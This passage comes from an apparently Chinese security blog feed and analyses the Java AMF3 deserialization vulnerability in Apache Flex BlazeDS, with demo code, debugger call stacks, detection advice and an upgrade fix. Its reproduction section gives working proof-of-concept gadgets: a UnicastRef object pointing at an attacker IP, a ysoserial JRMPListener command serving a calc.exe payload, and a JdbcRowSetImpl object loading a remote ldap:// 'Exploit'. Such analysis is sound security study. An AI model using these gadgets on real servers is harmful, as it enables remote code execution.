class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getName()"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setName()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.getAge()"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Person.setAge()"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person [name="</span> + name + <span class="string">", age="</span> + age + <span class="string">"]"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AMFDemo.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Person person = <span class="keyword">new</span> Person();</span><br><span class="line">        person.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        person.setAge(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(person);</span><br><span class="line">        System.out.println(<span class="string">"序列化："</span> + amf);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"反序列化："</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">Person.getName()</span><br><span class="line">Person.getAge()</span><br><span class="line">序列化：[B@681a9515</span><br><span class="line">Person构造函数</span><br><span class="line">Person.setName()</span><br><span class="line">Person.setAge()</span><br><span class="line">反序列化：flex.messaging.io.amf.ActionMessage@27bc2616</span><br></pre></td></tr></table></figure><h2 id="0x03-AMF3反序列化过程"><a href="#0x03-AMF3反序列化过程" class="headerlink" title="0x03 AMF3反序列化过程"></a>0x03 AMF3反序列化过程</h2><p>在AMF3反序列化过程中，程序会从Action消息中获取类名，构造新的对象，然后以成员值作为参数调用每个成员名对应的setter方法。这一个过程由专门的方法来实现，比如<code>flex.messaging.io.amf.Amf3Input</code>类中的<code>readScriptObject()</code>方法或者<code>flex.messaging.io.amf.Amf0Input</code>类中的<code>readObjectValue()</code>方法。</p><p>在deserialize()函数中，调用了AmfMessageDeserializer.readMessage()函数来读取Action Message内容，而在其中会调用readBody()函数来进一步读取Action Message的主体内容：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/1.png" alt=""></p><p>接着会调用AmfMessageDeserializer.readObject()函数：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/2.png" alt=""></p><p>往下跟进去，看到调用Amf0Input.readObject()，其中获取到type为17，然后调用readObjectValue()：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/3.png" alt=""></p><p>跟进readObjectValue()函数，由于type为17，就会进入调用Amf3Input.readObject()的逻辑：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/4.png" alt=""></p><p>跟进Amf3Input.readObject()函数，这里获取到type为10，再调用Amf3Input.readObjectValue()：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/5.png" alt=""></p><p>跟进Amf3Input.readObjectValue()函数，在AMF3协议中，当type数据类型为10时，则认为Java对象，就会调用readScriptObject()读取对象：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/6.png" alt=""></p><p>跟进readScriptObject()函数，看到调用createObjectInstance()函数来新建对象实例，可以看到是直接创建Person类实例了：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/7.png" alt=""></p><p>在AbstractAmfInput.createObjectInstance()函数中，调用AbstractProxy.createInstance()函数来新建实例：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/8.png" alt=""></p><p>再往下就是具体调用创建对象实例的函数调用过程、调用Person类构造函数。</p><p>此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:7, Person</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">newInstance:442, Class (java.lang)</span><br><span class="line">createDefaultInstance:120, ClassUtil (flex.messaging.util)</span><br><span class="line">createInstanceFromClassName:95, AbstractProxy (flex.messaging.io)</span><br><span class="line">createInstance:115, AbstractProxy (flex.messaging.io)</span><br><span class="line">createObjectInstance:169, AbstractAmfInput (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:746, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure><p>继续往下调试，调用完Person类的构造函数创建了对象实例后，程序会返回到Amf3Input.readScriptObject()函数中继续执行，会通过for循环遍历属性并调用BeanProxy.setValue()函数进行属性值的设置：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/9.png" alt=""></p><p>我们跟进几层，看到set()函数是通过反射机制来调用目标属性的setter方法的：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/10.png" alt=""></p><p>往下就是反射调用对应的属性的setter方法，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">setName:17, Person</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">set:867, BeanProxy$BeanProperty (flex.messaging.io)</span><br><span class="line">setValue:284, BeanProxy (flex.messaging.io)</span><br><span class="line">readScriptObject:776, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:40, AMFDemo</span><br><span class="line">main:19, AMFDemo</span><br></pre></td></tr></table></figure><p>接着遍历其他属性并反射调用其setter方法直至完成属性值的设置，最后返回对象实例。</p><p>此时可以看到，AMF3将对象方锦龙ActionMessage的body中，其属性值在data可看到：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/11.png" alt=""></p><h2 id="0x04-AMF3反序列化漏洞"><a href="#0x04-AMF3反序列化漏洞" class="headerlink" title="0x04 AMF3反序列化漏洞"></a>0x04 AMF3反序列化漏洞</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Apache Flex BlazeDS的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的都存在反序列化漏洞。</p><p>具体地说，是flex-messaging-xx系列jar包的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的存在漏洞。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>简单地说，AMF3反序列化漏洞原理就是反序列化调用了JavaBeans存在漏洞的setter方法导致的。</p><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><h4 id="基于UnicastRef的Gadget"><a href="#基于UnicastRef的Gadget" class="headerlink" title="基于UnicastRef的Gadget"></a>基于UnicastRef的Gadget</h4><p>修改AMFDemo.java，添加生成generateUnicastRef类对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object = generateUnicastRef(<span class="string">"192.168.10.129"</span>, <span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">        System.out.println(<span class="string">"ActionMessage: "</span> + actionMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">generateUnicastRef</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        java.rmi.server.ObjID objId = <span class="keyword">new</span> java.rmi.server.ObjID();</span><br><span class="line">        sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="keyword">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class="line">        sun.rmi.transport.LiveRef liveRef = <span class="keyword">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object data) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        MessageBody body = <span class="keyword">new</span> MessageBody();</span><br><span class="line">        body.setData(data);</span><br><span class="line">        ActionMessage message = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        message.addBody(body);</span><br><span class="line">        ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        AmfMessageSerializer serializer = <span class="keyword">new</span> AmfMessageSerializer();</span><br><span class="line">        serializer.initialize(SerializationContext.getSerializationContext(), out, <span class="keyword">null</span>);</span><br><span class="line">        serializer.writeMessage(message);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ActionMessage <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] amf)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">        ByteArrayInputStream in = <span class="keyword">new</span> ByteArrayInputStream(amf);</span><br><span class="line">        AmfMessageDeserializer deserializer = <span class="keyword">new</span> AmfMessageDeserializer();</span><br><span class="line">        deserializer.initialize(SerializationContext.getSerializationContext(), in, <span class="keyword">null</span>);</span><br><span class="line">        ActionMessage actionMessage = <span class="keyword">new</span> ActionMessage();</span><br><span class="line">        deserializer.readMessage(actionMessage, <span class="keyword">new</span> ActionContext());</span><br><span class="line">        <span class="keyword">return</span> actionMessage;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试下代码能否正常运行，监听下端口，看看是否能够成功建立连接：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/13.png" alt=""></p><p>此时，我们成功与客户端建立了一条通信连接，而且使用的还是Java RMI传输协议。</p><p>利用ysoserial工具，前提是目标环境存在可被反序列化利用的类，这里假设存在CommonsBeanutils1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsBeanutils1 calc.exe</span><br></pre></td></tr></table></figure><p>在Kali运行该命令开启JRMPListener监听，运行程序后Kali端接受到数据后就会发送payload，在Windows端就会弹计算器：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/14.png" alt=""></p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/15.png" alt=""></p><h4 id="基于JdbcRowSetImpl的Gadget"><a href="#基于JdbcRowSetImpl的Gadget" class="headerlink" title="基于JdbcRowSetImpl的Gadget"></a>基于JdbcRowSetImpl的Gadget</h4><p>JdbcRowSetImpl这条Gadget十分经典，原理和调试分析就不多说了，直接看PoC示例。</p><p><strong>注意，下面的代码写得有问题，只是给个示例方便自己记录一下，后面再进行分析修改。</strong></p><p>修改AMFDemo.java，传入一个JdbcRowSetImpl类对象进行反序列化，其中设置了DataSourceName和AutoCommit属性值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AMFDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object object = createPoC(<span class="string">"127.0.0.1"</span>, <span class="number">1389</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化对象，生成AMF Message对象</span></span><br><span class="line">        <span class="keyword">byte</span>[] amf = serialize(object);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化对象</span></span><br><span class="line">        ActionMessage actionMessage = deserialize(amf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createPoC</span><span class="params">(String host, <span class="keyword">int</span> port)</span> </span>&#123;</span><br><span class="line">        com.sun.rowset.JdbcRowSetImpl jdbcRowSet = <span class="keyword">new</span> com.sun.rowset.JdbcRowSetImpl();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            jdbcRowSet.setDataSourceName(<span class="string">"ldap://"</span> + host + <span class="string">":"</span> + port + <span class="string">"/Exploit"</span>);</span><br><span class="line">            jdbcRowSet.setAutoCommit(<span class="keyword">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jdbcRowSet;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>之所以能触发，和AMF3没有直接关系，是前面初始化JdbcRowSetImpl类对象的时候触发的：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/12.png" alt=""></p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>这里只对UnicastRef这条Gadget进行调试分析。</p><p>反序列化过程在之前已经整体跟踪分析过了，我们看下关键的几个地方。</p><p>我们直接在UnicastRef.invoke()方法上打断点，调试直接运行到这，此时函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">invoke:377, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure><p>在UnicastRef.invoke()函数中，调用了executeCall()函数，其实就是一个远程TCP连接调用：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/17.png" alt=""></p><p>跟进StreamRemoteCall.executeCall()函数中，看到该方法直接从in数据库中进行了readObject()操作：</p><p><img src="/2019/12/07/Java-AMF3反序列化漏洞/16.png" alt=""></p><p>再往下，就是调用ObjectInputStream.readObject()的Java原生反序列化的内容了。由于目标环境存在可被反序列化漏洞利用的CommonsBeanutils1相关的jar包（commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2），因此Kali会通过建立的TCP连接把CommonsBeanutils1对应的payload发送过来这个readObject()中进行反序列化操作，从而触发漏洞。</p><p>此时函数调用栈为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">readObject:371, ObjectInputStream (java.io)</span><br><span class="line">executeCall:245, StreamRemoteCall (sun.rmi.transport)</span><br><span class="line">invoke:379, UnicastRef (sun.rmi.server)</span><br><span class="line">dirty:-1, DGCImpl_Stub (sun.rmi.transport)</span><br><span class="line">makeDirtyCall:378, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:320, DGCClient$EndpointEntry (sun.rmi.transport)</span><br><span class="line">registerRefs:156, DGCClient (sun.rmi.transport)</span><br><span class="line">read:312, LiveRef (sun.rmi.transport)</span><br><span class="line">readExternal:493, UnicastRef (sun.rmi.server)</span><br><span class="line">readExternalizable:828, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readScriptObject:757, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:154, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObject:132, Amf3Input (flex.messaging.io.amf)</span><br><span class="line">readObjectValue:122, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:93, Amf0Input (flex.messaging.io.amf)</span><br><span class="line">readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)</span><br><span class="line">deserialize:55, AMFDemo</span><br><span class="line">main:16, AMFDemo</span><br></pre></td></tr></table></figure><h2 id="0x05-检测与方法"><a href="#0x05-检测与方法" class="headerlink" title="0x05 检测与方法"></a>0x05 检测与方法</h2><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><p>全局搜索是否使用flex-messaging-xx系列jar包，且版本是否&lt;4. 7.3；</p><p>若是则全局搜索如下关键代码排查，主要看AmfMessageDeserializer.readMessage()函数的参数是否外部可控：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flex.messaging.io.</span><br><span class="line">AmfMessageDeserializer</span><br><span class="line">readMessage(</span><br></pre></td></tr></table></figure><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>将flex-messaging相关jar包升级到4.7.3版本以上。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://www.anquanke.com/post/id/85846" target="_blank" rel="noopener">【技术分享】Java AMF3 反序列化漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java SnakeYaml反序列化漏洞</title>
    <link href="https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml反序列化漏洞/</id>
    <published>2019-11-29T13:17:19.000Z</published>
    <updated>2019-12-06T17:43:20.971Z</updated>
    
